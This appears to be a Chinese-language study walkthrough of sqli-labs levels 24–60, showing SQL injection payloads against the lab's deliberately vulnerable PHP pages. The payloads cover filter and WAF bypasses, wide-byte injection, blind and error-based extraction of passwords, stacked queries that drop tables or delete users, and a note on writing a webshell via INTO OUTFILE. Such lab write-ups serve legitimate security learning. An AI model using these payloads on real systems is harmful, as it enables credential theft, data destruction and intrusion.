## 0X18Less-24

二次注入

查看数据库内现有数据存在admin  密码为1；的用户

![image-20201111133146504](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201111133146504.png)

插入名为admin'# 用户

![image-20201111133320530](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201111133320530.png)

![image-20201111133340609](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201111133340609.png)

登陆后更改名为admin'#用户密码

![image-20201111133531034](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201111133531034.png)

![image-20201111133552451](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201111133552451.png)

查看数据库内数据

![image-20201111133620074](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201111133620074.png)

用户admin密码被更改

本关为二次排序注入的示范例。二次排序注入也成为存储型的注入，就是将可能导致sql注入的字符先存入到数据库中，当再次调用这个恶意构造的字符时，就可以触发sql注入。二次排序注入思路：

\1. 黑客通过构造数据的形式，在浏览器或者其他软件中提交HTTP数据报文请求到服务端进行处理，提交的数据报文请求中可能包含了黑客构造的SQL语句或者命令。

\2. 服务端应用程序会将黑客提交的数据信息进行存储，通常是保存在数据库中，保存的数据信息的主要作用是为应用程序执行其他功能提供原始输入数据并对客户端请求做出响应。

\3. 黑客向服务端发送第二个与第一次不相同的请求数据信息。

\4. 服务端接收到黑客提交的第二个请求信息后，为了处理该请求，服务端会查询数据库中已经存储的数据信息并处理，从而导致黑客在第一次请求中构造的SQL语句或者命令在服务端环境中执行。

\5. 服务端返回执行的处理结果数据信息，黑客可以通过返回的结果数据信息判断二次注入漏洞利用是否成功。

此例子中我们的步骤是注册一个admin'#的账号，接下来登录该帐号后进行修改密码。此时修改的就是admin的密码。

Sql语句变为UPDATE users SET passwd="New_Pass" WHERE username =' **admin' #** ' AND password=' ，

也就是执行了UPDATE users SET passwd="New_Pass" WHERE username =' admin'



## 0X19Less-25

根据?id=1'报错信息和  ?id=1"正常  判断单引号闭合

![image-20201111134453837](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201111134453837.png)

提示and和 or 过滤

![image-20201111134703257](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201111134703257.png)

查看代码

![image-20201111134736453](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201111134736453.png)

如何绕过or和and过滤。一般性提供以下几种思路：

```
大小写变形 Or,OR,oR

编码，hex，urlencode

添加注释/* or */ (无空格)

利用符号 and=&& or=||

双写or或and绕过
```

暂时只想到这些，还有的话可以补充。

本关方法（1）（2）（3）均无效，下面我们利用方法（4）和（5）进行。

报错注入payload

```
?id=1' || extractvalue(1,concat(0x7e,(select database()),0x7e)) --+
```

```
这里使用||来绕过or过滤。
```

![image-20201111135300061](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201111135300061.png)

```
?id=1' || extractvalue(1,concat(0x7e,(select group_concat(schema_name) from infoorrmation_schema.schemata),0x7e))--+

?id=1' || extractvalue(1,concat(0x7e,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema='security'),0x7e))--+ 

?id=1' || extractvalue(1,concat(0x7e,(select group_concat(column_name) from infoorrmation_schema.columns where table_schema='security' aandnd table_name='emails'),0x7e))--+

双写绕过and 和or

id=1' || extractvalue(1,concat(0x7e,(select group_concat(id,0x3a,email_id) from emails),0x7e))--+


```

或者使用联合查询（双写绕过or过滤）



## 0X1ALess-25a

相比25,无回显

联合查询

![image-20201111140234456](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201111140234456.png)

http://127.0.0.1/sql/Less-25a/index.php?id=-1 union select 1,(select group_concat(schema_name) from infoorrmation_schema.schemata),2

**这里将information_schema改为infoorrmation_schema来绕过or过滤。**

……

?id=-1 union select 1,(select group_concat(id,0x3e,referer,0x3e,ip_address) from referers),2 获取内容



## 0X1BLess-26

![image-20201111142014565](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201111142014565.png)

使用没空格的报错注入

![image-20201111141934343](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201111141934343.png)

括号绕过

![image-20201111142215015](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201111142215015.png)



## 0X1CLess-26a

相比26多括号闭合 ，并且报错信息不在前端显示 无法使用报错注入

联合查询

?id=100')union%a0select%a01,database(),('3    爆当前数据库   %a0替换空格，注释符号被过滤因此无法使用

![image-20201111143138492](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201111143138492.png)

```
?id=100')union%a0select%a01,(select%a0group_concat(schema_name)%a0from%a0infoorrmation_schema.schemata),('3    爆数据库

?id=100')union%a0select%a01,(select%a0group_concat(table_name)%a0from%a0infoorrmation_schema.tables%a0where%a0table_schema='security'),('3

爆数据表

?id=100')union%a0select%a01,(select%a0group_concat(column_name)%a0from%a0infoorrmation_schema.columns%a0where%a0table_schema='security'%a0aandnd%a0table_name='users'),('3   爆列

?id=100')union%a0select%a01,(select%a0group_concat(username,0x3a,passwoorrd)%a0from%a0security.users),('3 爆数据


```



## 0X1DLess-27

在26基础上过滤union和select 

![image-20201111144748681](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201111144748681.png)

?id=100'unIOn%a0seLect%a01,database(),'3

使用大小写或者双写绕过

## 0X1ELess-27a

```
function blacklist($id)
{
$id= preg_replace('/[\/\*]/',"", $id);        //strip out /*
$id= preg_replace('/[--]/',"", $id);        //Strip out --.
$id= preg_replace('/[#]/',"", $id);            //Strip out #.
$id= preg_replace('/[ +]/',"", $id);        //Strip out spaces.
$id= preg_replace('/select/m',"", $id);        //Strip out spaces.
$id= preg_replace('/[ +]/',"", $id);        //Strip out spaces.
$id= preg_replace('/union/s',"", $id);        //Strip out union
$id= preg_replace('/select/s',"", $id);        //Strip out select
$id= preg_replace('/UNION/s',"", $id);        //Strip out UNION
$id= preg_replace('/SELECT/s',"", $id);        //Strip out SELECT
$id= preg_replace('/Union/s',"", $id);        //Strip out Union
$id= preg_replace('/Select/s',"", $id);        //Strip out Select
return $id;
}
$id=$_GET['id'];
$id= blacklist($id);
$id = '"' .$id. '"';
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
//print_r(mysql_error());
```

与27关的区别在于对于id的处理，这里用的是 " ，同时mysql的错误不会在前端页面显示。

我们根据27关直接给出一个示例payload：

?id=100"unIOn%a0seLect%a01,database(),"3

![image-20201111145146772](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201111145146772.png)



## 0X1FLess-28

```
function blacklist($id)
{
$id= preg_replace('/[\/\*]/',"", $id);                //strip out /*
$id= preg_replace('/[--]/',"", $id);                //Strip out --.
$id= preg_replace('/[#]/',"", $id);                    //Strip out #.
$id= preg_replace('/[ +]/',"", $id);                //Strip out spaces.
//$id= preg_replace('/select/m',"", $id);                    //Strip out spaces.
$id= preg_replace('/[ +]/',"", $id);                //Strip out spaces.
$id= preg_replace('/union\s+select/i',"", $id);        //Strip out UNION & SELECT.
return $id;
}

$id=$_GET['id'];
$id= blacklist($id);
$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";
//print_r(mysql_error());
```

正则表达式'/union\s+select/i'中，\s表示空格，+表示匹配一次或多次，/i表示不区分大小写，所以整体表示匹配 union加一个或多个空格加select，其中union和select不区分大小写。

所以我们可以将union 和 select中间的空格使用%a替换，

```
?id=100')union%a0select%a01,database(),3||('1
```

![image-20201111150116651](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201111150116651.png)

```
?id=100')union%a0select%a01,(select%a0group_concat(schema_name)%a0from%a0information_schema.schemata),3||('1
```

![image-20201111150302450](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201111150302450.png)

```
?id=100')union%a0select%a01,(select%a0group_concat(table_name)%a0from%a0information_schema.tables%a0where%a0table_schema='security'),3||('1
```

![image-20201111150827605](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201111150827605.png)

```
?id=100')union%a0select%a01,(select%a0group_concat(column_name)%a0from%a0information_schema.columns%a0where%a0table_name='users'),3||('1
```

![image-20201111150944947](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201111150944947.png)

```
?id=100')union%a0select%a01,(select%a0group_concat(password)%a0from%a0security.users),3||('1
```

![image-20201111151554326](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201111151554326.png)

## 0X20Less-28a

```
function blacklist($id)
{
//$id= preg_replace('/[\/\*]/',"", $id);                //strip out /*
//$id= preg_replace('/[--]/',"", $id);                //Strip out --.
//$id= preg_replace('/[#]/',"", $id);                    //Strip out #.
//$id= preg_replace('/[ +]/',"", $id);                //Strip out spaces.
//$id= preg_replace('/select/m',"", $id);                    //Strip out spaces.
//$id= preg_replace('/[ +]/',"", $id);                //Strip out spaces.
$id= preg_replace('/union\s+select/i',"", $id);        //Strip out spaces.
return $id;
}

$id=$_GET['id'];
$id= blacklist($id);
$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";
//print_r(mysql_error());
```

本关与less28基本一致，只是过滤条件少了几个。

```
?id=100')union%a0select 1,database(),3||('1
```



## 0X21Less-29

同less-2

![image-20201111153119637](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201111153119637.png)



考点 绕waf

参数污染

![image-20201111153726731](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201111153726731.png)

**显示的是id=2的内容 但是waf检测的是前面id=1的内容**

![image-20201111153638489](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201111153638489.png)

```
?id=1&id=-1' union select 1,2,database() --+
```

![image-20201111153546513](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201111153546513.png)



## 0X22Less-30

跟上题差不多，只不过双引号闭合。

```
?id=1&id=" union select 1,database(),3 --+
```



## 0X23Less-31

闭合添加括号，其余相同

![image-20201111154315073](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201111154315073.png)



## 0X24Less-32

介绍一下宽字节注入的原理和基本用法。

原理：mysql在使用GBK编码的时候，会认为两个字符为一个汉字，例如%aa%5c就是一个汉字（前一个ascii码大于128才能到汉字的范围）。我们在过滤 ' 的时候，往往利用的思路是将 ' 转换为 \' （转换的函数或者思路会在每一关遇到的时候介绍）。

因此我们在此想办法将 ' 前面添加的 \ 除掉，一般有两种思路：

1. %df吃掉 \ 具体的原因是urlencode(\') = %5c%27，我们在%5c%27前面添加%df，形成%df%5c%27，而上面提到的mysql在GBK编码方式的时候会将两个字节当做一个汉字，此事%df%5c就是一个汉字，%27则作为一个单独的符号在外面，同时也就达到了我们的目的。
2. 将 \' 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27的情况，后面的%5c会被前面的%5c给注释掉。这也是bypass的一种方法。

添加单引号 看到被转义，考虑宽字节注入

![image-20201111155516862](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201111155516862.png)

?id=-1%df' union select 1,database(),3--+   payload 在引号前添加%df即可

![image-20201111160021292](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201111160021292.png)



## 0X25Less-33

```
function check_addslashes($string)
{
    $string= addslashes($string);    
    return $string;
}

$id=check_addslashes($_GET['id']);
mysql_query("SET NAMES gbk");
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
print_r(mysql_error());
```

addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。

预定义字符是：

```
单引号（'）
双引号（"）
反斜杠（\）
NULL
```

32关只不过是用正则去实现的类似addslashes()，函数的功能。

不用更改payload 同Less-32一样

## 0X26Less-34

本关是post型的注入漏洞，同样的也是将post过来的内容进行了 ' \ 的处理。由上面的例子可以看到我们的方法就是将过滤函数添加的 \ 给吃掉。而get型的方式我们是以url形式提交的，因此数据会通过URLencode，如何将方法用在post型的注入当中，我们此处介绍一个新的方法。将utf-8转换为utf-16或 utf-32，例如将 ' 转为utf-16为 �' 。我们就可以利用这个方式进行尝试。

我们用万能密码的方式的来突破这一关。

例如直接提交username：�' or 1=1#

password：随便乱填

![image-20201111162126979](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201111162126979.png)

POST型

```
uname=admin%df'||1#&passwd=aaa&submit=Submit
```

![image-20201111162621950](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201111162621950.png)

水平越权uname=admin%df'or 1 limit 2,1#&passwd=aaa&submit=Submit

![image-20201111162827723](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201111162827723.png)



## 0X27Less-35

```
function check_addslashes($string)
{
$string = addslashes($string);
return $string;
}

$id=check_addslashes($_GET['id']);
mysql_query("SET NAMES gbk");
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
```

id没有被' "符号包括起来，那我们就没有必要去考虑check_addslashes()函数的意义了

?id=-1 union select 1,database(),3--+



## 0X28Less-36

```
function check_quotes($string)
{
    $string= mysql_real_escape_string($string);    
    return $string;
}
$id=check_quotes($_GET['id']);
mysql_query("SET NAMES gbk");
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
print_r(mysql_error());
```

上面的check_quotes()函数是利用了mysql_real_escape_string()函数进行的过滤。

mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。

下列字符受影响：

- \x00
- \n
- \r
- \
- '
- "
- \x1a

如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。

但是因mysql我们并没有设置成gbk，所以mysql_real_escape_string()依旧能够被突破。方法和上述是一样的。

利用%df

#失败，尝试--+成功

![image-20201111164349961](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201111164349961.png)



利用 ' 的utf-16突破

?id=-1%EF%BF%BD%27union select 1,user(),3--+

![image-20201111164656050](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201111164656050.png)



## 0X29Less-37



```
$uname1=$_POST['uname'];
$passwd1=$_POST['passwd'];

$uname = mysql_real_escape_string($uname1);
$passwd= mysql_real_escape_string($passwd1);

mysql_query("SET NAMES gbk");
@$sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";
```

同34，区别在于处理post内容用的是mysql_real_escape_string()函数，而不是addslashes()函数，



Summary:

从上面的几关当中，可以总结一下过滤 ' \ 常用的三种方式是使用preg_replace()直接replace，addslashes()，mysql_real_escape_string()。三种方式仅仅依靠一个函数是不能完全防御的，所以我们在编写代码的时候需要考虑的更加仔细。同时在上述过程中，我们也给出三种防御的方式：

- 使用preg_replace()直接replace时，不要将mysql编码设置为gbk。
- 使用addslashes()时，我们需要将mysql_query设置为binary的方式，才能防御此漏洞
- 使用mysql_real_escape_string()时，需要将mysql设置为gbk即可。



## 0X2ALess-38

user表中数据

![image-20201111170407936](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201111170407936.png)

?id=1';insert into users(id,username,password) values ('38','less38','hello')--+

![image-20201111170520545](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201111170520545.png)

执行后再次查看，插入了less38的用户

![image-20201111170618202](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201111170618202.png)

## 0X2BLess-39

和less-38的区别在于sql语句的不一样：SELECT * FROM users WHERE id=$id LIMIT 0,1

也就是数字型注入，我们可以构造以下的payload：

?id=1;insert into users(id,username,password) values ('39','less39','hello')--+

![image-20201111171043638](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201111171043638.png)

查看数据库 已插入less39 数据

![image-20201111171104637](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201111171104637.png)

## 0X2CLess-40

本关的sql语句为SELECT * FROM users WHERE id=('$id') LIMIT 0,1

我们根据sql语句构造以下的payload：

?id=1');insert into users(id,username,password) values ('40','less40','hello')--+

![image-20201111171618000](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201111171618000.png)

![image-20201111171633472](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201111171633472.png)



## 0X2DLess-41

与less-39是一致的，区别在于41错误不回显。所以我们称之为盲注。

Payload：

?id=1;insert into users(id,username,password) values ('41','less41','hello')--+



## 0X2ELess-42

pass_change.php关键代码

```
$username= $_SESSION["username"];
$curr_pass= mysql_real_escape_string($_POST['current_password']);
$pass= mysql_real_escape_string($_POST['password']);
$re_pass= mysql_real_escape_string($_POST['re_password']);
$sql = "UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' ";
```

pdate更新数据后，经过mysql_real_escape_string()处理后的数据，存入到数据库当中后不会发生变化。在select调用的时候才能发挥作用。所以不用考虑在更新密码处进行注入，这关和二次注入的思路是不一样的。

本关从login.php源代码中分析可知：

```
$username = mysqli_real_escape_string($con1,$_POST["login_user"]);
$password = $_POST["login_password"];
$sql = "SELECT * FROM users WHERE username='$username' and password='$password'";
```

Password变量在post过程中，没有通过mysql_real_escape_string()函数的处理。因此在登录的时候密码选项我们可以进行attack。

通过报错猜测闭合

![image-20201112150746787](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201112150746787.png)

![image-20201111175146215](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201111175146215.png)

用户名随意，Password:c';create table less42 like users#

![image-20201111175402223](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201111175402223.png)

![image-20201111175309911](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201111175309911.png)

c';drop table less42#删除表

![image-20201111175702054](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201111175702054.png)



或者**万能密码**绕过 `1' or 1#`

![image-20201112152104825](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201112152104825.png)

或者报错注入

1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(CAST(CONCAT(username,password) AS CHAR),0x7e)) FROM users LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)#

![image-20201112152217818](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201112152217818.png)

## 0X2FLess-43

本关与42关的原理基本一致，我们还是定位在login.php中的password。关键代码：

```
$username = mysqli_real_escape_string($con1, $_POST["login_user"]);
$password = $_POST["login_password"];
$sql = "SELECT * FROM users WHERE username=('$username') and password=('$password')";
```

多了）闭合

![image-20201112150858397](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201112150858397.png)

![image-20201112150155124](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201112150155124.png)

payload

');delete from users where username="admin";#

![image-20201112150406365](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201112150406365.png)

## 0X30Less-44

相比前两关没有报错信息，

login_password=0' union select 1,database(),3;#

或采用Less-42相同payload

![image-20201112151028687](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201112151028687.png)



## 0X31Less-45

同43,但无报错信息，无法使用报错注入，其余利用手法相同

## 0X32Less-46

```php
# GET 方式获取 sort 参数
$id=$_GET['sort'];

# 直接将 id 带入 SQL 中
$sql = "SELECT * FROM users ORDER BY $id";

if 查询成功：
    输出查询信息
else：
    print_r(mysql_error());
```

order by 不同于 where 后的注入点，不能使用 union 等进行注入。注入方式十分灵活，下面在本关来详细讲解一下。



升降序验证

?sort=1 asc

?sort=1 desc

结果不相同

<img src="https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201112154645816.png" alt="image-20201112154645816" style="zoom:50%;" />

<img src="https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201112154605416.png" alt="image-20201112154605416" style="zoom:50%;" />



rand()验证

rand(ture) 和 rand(false) 的结果是不一样的

```payload
?sort=rand(true)
?sort=rand(false)
```

<img src="https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201112154848079.png" alt="image-20201112154848079" style="zoom:50%;" />

<img src="https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201112154914884.png" alt="image-20201112154914884" style="zoom:50%;" />

延时验证

Payload

```payload
?sort=sleep(1)
?sort=(sleep(1))
?sort=1 and sleep(1)
```

这种方式均可以延时，延时的时间为 (行数*1) 秒



报错注入

?sort=(select count(*) from information_schema.columns group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2)))

![image-20201112155236033](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201112155236033.png)



?sort=1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)

```payload
?sort=1 procedure analyse(extractvalue(rand(),concat(0x3a,(SELECT+CONCAT_WS(':',username,password)+FROM+users limit 0,1))),1)
```

![image-20201112155447767](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201112155447767.png)



布尔盲注

数据库第 1 位为：s

Payload

```payload
?sort=rand(left(database(),1)>'r')
?sort=rand(left(database(),1)>'s')
```

根据返回值顺序有无改变判断值



延时注入

数据库第一个字母的 ascii 码为 115，即`s`

Payload

```payload
?sort=rand(if(ascii(substr(database(),1,1))>114,1,sleep(1)))
```

```payload
?sort=rand(if(ascii(substr(database(),1,1))>115,1,sleep(1)))
```



上传马

Into outtfile /var/www/html/xxxx lines terminated by 0x(网马进行16进制转换)

需要权限

## 0X33Less-47

同46类似，多了’闭合

?sort=1' procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)--+

手法相同

![image-20201112161033298](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201112161033298.png)



## 0X34Less-48

相比之前无报错回显

其他手法依然可用

通过rand()进行盲注

?sort=rand(ascii(left(database(),1))=115)

?sort=rand(ascii(left(database(),1))=116)

?sort=rand(ascii(left(database(),1))=117)根据变化判断第一位ascii为115

<img src="https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201112161537091.png" alt="image-20201112161537091" style="zoom:50%;" />

或者延时注入

?sort=1 and (If(ascii(substr(database(),1,1))=115,0,sleep(5)))



## 0X35Less-49

相比48多了‘闭合 依旧可以使用延时注入

?sort=1' and (if(ascii(substr((select username from users where id=1),1,1))=115,0,sleep(5)))--+

![image-20201112162450032](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201112162450032.png)



## 0X36Less-50

46的方法依旧可以用，但是查询方式由 mysql_query 变成了 mysqli_multi_query，因此支持堆叠注入

?sort=1;create table less50 like users

![image-20201112163124769](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201112163124769.png)

![image-20201112163149116](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201112163149116.png)

?sort=1;drop table less50

![image-20201112163229847](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201112163229847.png)

## 0X37Less-51

相比50多了’闭合

```
$id=$_GET['sort'];    
$sql="SELECT * FROM users ORDER BY '$id'";
mysqli_multi_query($con1, $sql);
```

?sort=1';create table less51 like users--+

## 0X38Less-52

和less50是一样的，只是这里的mysql错误不会在前台显示，但是对于stacked injection是一样的利用方式

?sort=1;create table less52 like users



## 0X39Less-53

和less51是一样的，只是这里的mysql错误不会在前台显示，但是对于stacked injection是一样的利用方式

?sort=1';create table less53 like users--+



## 0X3ALess-54

表名和密码每十次尝试后就强制进行更换

首先判断闭合

?id=1' --+  //正常

?id=1'   //无回显 

判断单引号闭合

?id=-1' union select 1,2,3--+判断显示位

![image-20201112165308431](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201112165308431.png)

union联合查询

?id=-1' union select 1,2,database()--+

![image-20201112165655446](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201112165655446.png)

?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='challenges'--+

![image-20201112165827512](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201112165827512.png)

获取到表名GNDVE6NJTD

?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='challenges' and table_name='GNDVE6NJTD'--+

![image-20201112170000583](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201112170000583.png)

获取到 字段id,sessid,secret_X9Y3,tryy

?id=-1' union select 1,2,(select group_concat(secret_X9Y3) from challenges.GNDVE6NJTD)--+

![image-20201112170427948](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201112170427948.png)

获取到数据bTDwbx0gNAv1PuHChSZn4igS

![image-20201112170507777](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201112170507777.png)



## 0X3BLess-55

相比54关  55更换了闭合方式

![image-20201112172645791](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201112172645791.png)

通过测试?id=1) --+ 与?id=1) 结果不同判断）闭合

其余与54类似

![image-20201112172903412](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201112172903412.png)

获取表名BLA4DLSZPG

![image-20201112173139654](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201112173139654.png)

获取到列名sessid,secret_XU4A

```
?id=-1)%20union%20select%201,2,group_concat(secret_XU4A)%20from%20challenges.BLA4DLSZPG--+
```

![image-20201112173255692](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201112173255692.png)

x2r1qvXjUt9c0EynN17OrDhM

![image-20201112173355345](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201112173355345.png)



## 0X3CLess-56

同Less-55类似 闭合方式不同    ‘）其余相同

![image-20201112174409460](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201112174409460.png)



## 0X3DLess-57

判断闭合

?id=1  //正常

![image-20201113092201586](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201113092201586.png)

?id=1' //正常   无报错，说明闭合中无‘

![image-20201113092318436](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201113092318436.png)

?id=1"   //报错

![image-20201113092407251](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201113092407251.png)

?id=1" and 1=1 --+   //正常

?id=1" and 1=2  --+  //报错

![image-20201113092524103](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201113092524103.png)

判断闭合为”

?id=1" order by 3 --+ //正常

?id=1" order by 4 --+ //报错

判断列数3

![image-20201113092716798](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201113092716798.png)

?id=-1" union select 1,2,3 --+

显示位 2，3

![image-20201113092926238](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201113092926238.png)

?id=1" union select 1,2,database();

![image-20201113093058284](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201113093058284.png)

id=-1" union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='challenges'--+

![image-20201113093410312](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201113093410312.png)

表名EAKNUWG0W2

?id=-1" union select 1,2,group_concat(column_name) from information_schema.columns where  table_name='EAKNUWG0W2'--+

![image-20201113093747682](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201113093747682.png)

字段名id,sessid,secret_OH7M,tryy

?id=-1" union select 1,2,(select group_concat(secret_OH7M) from challenges.EAKNUWG0W2)--+

![image-20201113094004095](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201113094004095.png)

fBWIoKAW1ImFDuonfwoyJNaV

![image-20201113094033612](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201113094033612.png)

## 0X3ELess-58

判断闭合

?id=1'    //报错

?id=1' and 1=1;  //正常

?id=1' and 1=2;   //不正常

判断列数

![image-20201113095500922](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201113095500922.png)

执行sql语句后，并没有返回数据库当中的数据

![image-20201113095704102](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201113095704102.png)



?id=1' and 1=(updatexml(1,concat(0x3a,(select database())),1))%23

报错注入

![image-20201113095909219](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201113095909219.png)

?id=1' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) --+



![image-20201113103129503](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201113103129503.png)

表名RMAMEUAGKO

?id=-1' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='challenges' and table_name='dzgnt6f0xz'),0x7e))--+

![image-20201113105720248](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201113105720248.png)

id,sessid,secret_6Q42,tryy

?id=-1' and extractvalue(1,concat(0x7e,(select group_concat(secret_6Q42) from RMAMEUAGKO),0x7e))--+

![image-20201113105816615](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201113105816615.png)

ZjkBDvfBTQkzn7aAr5VrReRS

![image-20201113105930891](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201113105930891.png)



## 0X3FLess-59

判断闭合

?id=1 //

?id=1'

?id=1' --+

?id=1" 

……

?id=1 and 1=2 --+

?id=1 and 1=1 --+

数字型

爆表名

?id=1 and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='challenges'),0x7e))--+

![image-20201113110337289](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201113110337289.png)

Q0RQXNZCIP

?id=1 and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='Q0RQXNZCIP'),0x7e))--+

![image-20201113110454981](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201113110454981.png)

列名

id,sessid,secret_GZ7I,tryy

?id=-1 and extractvalue(1,concat(0x7e,(select group_concat(secret_GZ7I) from Q0RQXNZCIP),0x7e))--+

![image-20201113110631209](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201113110631209.png)

ovguOdpjQX4H3cDdcgN681Sq

![image-20201113110655376](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201113110655376.png)

## 0X40Less-60

?id=1'  正常  

?id=1) 正常   

?id=1" 报错  说明存在“闭合

